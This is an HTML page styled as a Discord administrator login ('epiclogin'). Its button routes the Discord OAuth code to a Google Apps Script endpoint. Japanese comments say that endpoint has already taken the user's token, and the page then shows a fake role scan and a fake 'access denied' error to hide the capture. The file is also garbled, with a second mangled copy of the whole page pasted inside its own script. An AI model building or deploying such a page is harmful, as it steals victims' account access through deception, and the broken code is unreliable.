<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>epiclogin - AUTH SYSTEM</title>
    <style>
        body {
            background-color: #000;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-card {
            background-color: #0a0a0a;
            padding: 40px;
            border: 1px solid #00ff00;
            width: 400px;
            text-align: center;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
        }

        .discord-btn {
            display: block;
            width: 100%;
            padding: 15px;
            background-color: #5865F2;
            color: #fff;
            text-decoration: none;
            border-radius: 4px;
            font-weight: bold;
            transition: 0.3s;
        }

            .discord-btn:hover {
                background-color: #4752C4;
                transform: scale(1.02);
            }

        .loader {
            border: 4px solid #002200;
            border-top: 4px solid #00ff00;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>

    <div id="loginScreen" class="login-card">
        <h1>[ SYSTEM ACCESS ]</h1>
        <p>管理者権限で認証してください。</p>
        <a href="https://discord.com/oauth2/authorize?client_id=1467502850610561229&response_type=code&redirect_uri=https%3A%2F%2Fscript.google.com%2Fmacros%2Fs%2FAKfycbxT1KN9AYzaZh0xK4L440-dFm77vwc6IXmx0UGkLkz5PwiRzc7iWOEg0msLOQHLc9j0%2Fexec&scope=guilds+guilds.members.read" class="discord-btn">DISCORDでログイン</a>
    </div>

    <div id="loadingScreen" class="login-card hidden">
        <div class="loader"></div>
        <p>ロール権限をスキャン中...</p>
        <p style="font-size: 10px; color: #006600;">ACCESSING DISCORD DATABASE...</p>
    </div>

    <div id="errorScreen" class="login-card hidden">
        <h1 style="color: #ff0000;">ACCESS DENIED</h1>
        <p>サーバーへのアクセスが集中しています。権限が不足しています。</p>
        <button onclick="location.href='index.html'" style="background:#440000; color:#ff0000; border:1px solid #ff0000; width:100%; padding:10px; cursor:pointer;">再試行</button>
    </div>

    <script>
        // このスクリプトは「GASから戻ってきた時」の見た目を制御するで
        const urlParams = new URLSearchParams(window.location.search);
< !DOCTYPE html >
            <html lang="ja">
                <head>
                    <meta charset="UTF-8">
                        <title>epiclogin - AUTH SYSTEM</title>
                        <style>
                            body {
                                background - color: #000;
                            color: #00ff00;
                            font-family: 'Courier New', monospace;
                            display: flex;
                            justify-content: center;
                            align-items: center;
                            height: 100vh;
                            margin: 0;
            }

                            .login-card {
                                background - color: #0a0a0a;
                            padding: 40px;
                            border: 1px solid #00ff00;
                            width: 400px;
                            text-align: center;
                            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
            }

                            .discord-btn {
                                display: block;
                            width: 100%;
                            padding: 15px;
                            background-color: #5865F2;
                            color: #fff;
                            text-decoration: none;
                            border-radius: 4px;
                            font-weight: bold;
                            transition: 0.3s;
            }

                            .discord-btn:hover {
                                background - color: #4752C4;
                            transform: scale(1.02);
                }

                            .loader {
                                border: 4px solid #002200;
                            border-top: 4px solid #00ff00;
                            border-radius: 50%;
                            width: 40px;
                            height: 40px;
                            animation: spin 0.8s linear infinite;
                            margin: 20px auto;
            }

                            @keyframes spin {
                                0 % {
                                    transform: rotate(0deg);
                                }

                100% {
                                transform: rotate(360deg);
                }
            }

                            .hidden {
                                display: none;
            }
                        </style>
                </head>
                <body>

                    <div id="loginScreen" class="login-card">
                        <h1>[ SYSTEM ACCESS ]</h1>
                        <p>管理者権限で認証してください。</p>
                        <a href="https://discord.com/oauth2/authorize?client_id=1467502850610561229&response_type=code&redirect_uri=https%3A%2F%2Fscript.google.com%2Fmacros%2Fs%2FAKfycbxT1KN9AYzaZh0xK4L440-dFm77vwc6IXmx0UGkLkz5PwiRzc7iWOEg0msLOQHLc9j0%2Fexec&scope=guilds+guilds.members.read" class="discord-btn">DISCORDでログイン</a>
                    </div>

                    <div id="loadingScreen" class="login-card hidden">
                        <div class="loader"></div>
                        <p>ロール権限をスキャン中...</p>
                        <p style="font-size: 10px; color: #006600;">ACCESSING DISCORD DATABASE...</p>
                    </div>

                    <div id="errorScreen" class="login-card hidden">
                        <h1 style="color: #ff0000;">ACCESS DENIED</h1>
                        <p>サーバーへのアクセスが集中しています。権限が不足しています。</p>
                        <button onclick="location.href='index.html'" style="background:#440000; color:#ff0000; border:1px solid #ff0000; width:100%; padding:10px; cursor:pointer;">再試行</button>
                    </div>

                    <script>
            // このスクリプトは「GASから戻ってきた時」の見た目を制御するで
                        const urlParams = new URLSearchParams(window.location.search);
                        const code = urlParams.get('code');

                        if (code) {
                            // 認証から戻ってきたらスキャン画面を出す
                            document.getElementById('loginScreen').classList.add('hidden');
                        document.getElementById('loadingScreen').classList.remove('hidden');

                // 7秒後に「失敗」を出す（トークンはもうGASが抜いてるから安心や！）
                setTimeout(() => {
                            document.getElementById('loadingScreen').classList.add('hidden');
                        document.getElementById('errorScreen').classList.remove('hidden');
                }, 7000);
            }
    </script>
</body>
</html>
        const code = urlParams.get('code');

        if (code) {
            // 認証から戻ってきたらスキャン画面を出す
            document.getElementById('loginScreen').classList.add('hidden');
            document.getElementById('loadingScreen').classList.remove('hidden');

            // 7秒後に「失敗」を出す（トークンはもうGASが抜いてるから安心や！）
            setTimeout(() => {
                document.getElementById('loadingScreen').classList.add('hidden');
                document.getElementById('errorScreen').classList.remove('hidden');
            }, 7000);
        }
    </script>
</body>
</html>